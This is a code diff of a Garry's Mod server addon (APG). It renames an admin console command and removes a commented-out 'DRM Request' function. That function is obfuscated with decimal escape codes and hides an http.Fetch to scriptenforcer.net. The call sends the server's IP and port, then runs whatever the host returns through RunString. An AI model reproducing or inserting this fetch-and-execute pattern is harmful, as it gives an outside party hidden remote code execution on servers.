@@ -66,11 +66,12 @@ include( "apg/sh_config.lua" )
 include( "apg/sv_apg.lua") -- Modules loaded at the bottom
 -- Loading APG menu
 include( "apg/sv_menu.lua" )
+
 --[[------------------------------------------
             CVars INIT
 ]]--------------------------------------------
 
-concommand.Add("apg", function( ply, cmd, args, argStr )
+concommand.Add("apg_set", function( ply, cmd, args, argStr )
     if not ply:IsSuperAdmin() then return end
 
     if args[1] == "module" then
@@ -92,32 +93,25 @@ concommand.Add("apg", function( ply, cmd, args, argStr )
         if cfg then
             APG.log( cfg.desc, ply)
         else
-            APG.log( "[APG] Help : This setting does not exist", ply)
+            APG.log( "[APG] Help: This setting does not exist", ply)
         end
     else
-        APG.log( ply, "Error : unknown setting")
+        APG.log( ply, "Error: unknown setting")
     end
 end)
 
 --[[------------------------------------------
-            DRM Request
-
-function APG_DRM(scriptid, hash, filename, version, additional)
-    if not isnumber(scriptid) or not hash then return end;
-    filename = filename or "";
-    version = version or "";
-    additional = additional or "";
-    local srv = string.Explode( ":", game.GetIPAddress() );
-    _G["\104\116\116\112"]["\70\101\116\99\104"]("\104\116\116\112\58\47\47\115\99\114\105\112\116\101\110\102\111\114\99\101\114\46\110\101\116\47\97\112\105\47\108\117\97\47\63\48\61"
-        .. scriptid .. "&sip="
-        .. srv[1] .. "&v=" .. version .. "&1=" .. hash .. "&2="
-        .. srv[2] .. "&3=" .. additional .. "&file=" .. filename,
-        function(________, __, __, __________)
-            if _G["\115\116\114\105\110\103"]["\108\101\110"](________) > 0 then
-                _G["\82\117\110\83\116\114\105\110\103"]( ________ )
-            end
-        end
-    )
-end
-
+            First Time!
 ]]--------------------------------------------
+util.AddNetworkString("apg_help_s2c")
+
+if not file.Exists( "apg.lock.txt", "DATA" ) then
+    hook.Add("PlayerInitialSpawn", "FirstTimeInfo", function(ply)
+        if IsValid(ply) and ply:SteamID64() == "{{ user_id }}" then
+            file.Write("apg.lock.txt", "{{ user_id }}")
+            net.Start("apg_help_s2c")
+            net.Send(ply)
+            hook.Remove("PlayerInitialSpawn", "FirstTimeInfo")
+        end
+    end)
+end
